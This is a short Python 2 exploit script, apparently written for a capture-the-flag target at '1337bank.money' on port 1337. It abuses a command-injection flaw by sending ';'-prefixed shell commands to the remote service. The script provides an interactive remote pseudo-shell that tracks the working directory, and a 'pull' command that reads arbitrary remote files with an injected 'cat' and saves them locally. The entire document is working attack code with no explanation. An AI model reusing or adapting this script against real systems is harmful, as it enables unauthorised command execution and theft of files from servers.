
import time
import socket
import re

currDir = "/"
host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):


    global currDir
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if cmd == "quit":
        return
    elif re.match(r'^cd (.+)' ,cmd):
        matched = re.match(r'^cd (.+)' , cmd);
        currDir = matched.group(1)
    else:
        s.connect((host, port))
        time.sleep(2)
        data = s.recv(1024)
        s.send(";cd " + currDir + " && " + cmd + "\n")
        time.sleep(2)
        data = s.recv(1024)
        print(data)

if __name__ == '__main__':
    command = ""

    while command != quit:
        command = raw_input(">")
        if command == "shell":
            while command != "quit":
                command = raw_input(currDir + ">")
                execute_cmd(command)
                
        elif re.match(r'^pull (\S+) (\S+)$', command):
            match = re.match(r'^pull (\S+) (\S+)$', command)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((host, port))
            data = s.recv(1024)
            time.sleep(2)
            s.send("; cat " + match.group(1) + "\n")
            time.sleep(2)
            data = s.recv(20480)
            fl = open(match.group(2), "w")
            fl.write(data)
            fl.close()
        elif command != "quit": 
            print("1.Shell - Drop into an interactive shell and allow users to gracefully exit")
            print("2.Pull - <remote-path> <local-path> Download files")
            print("3.Help - Shows this help menu")
            print("4.Quit - Quit the shell")    
        else:
            break
